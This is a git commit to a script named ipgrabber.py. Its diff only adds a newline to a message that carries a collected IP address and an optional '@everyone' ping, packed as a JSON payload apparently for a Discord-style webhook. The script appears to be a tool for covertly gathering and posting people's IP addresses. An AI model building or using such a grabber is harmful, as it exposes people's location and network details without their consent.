54168602127c41f609cd5d1e77dfb3465b3d0945
TotoAJ <67079777+TotoAJ@users.noreply.github.com>
2021-06-19 19:00:10 -0700

    Update ipgrabber.py

--- ipgrabber.py
+++ ipgrabber.py
@@ -11,7 +11,7 @@ headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
 }
 
-message = '@everyone' if ping else ''
+message = '@everyone\n' if ping else ''
 message += dt['ip']
 payload = json.dumps({'content': message})
 
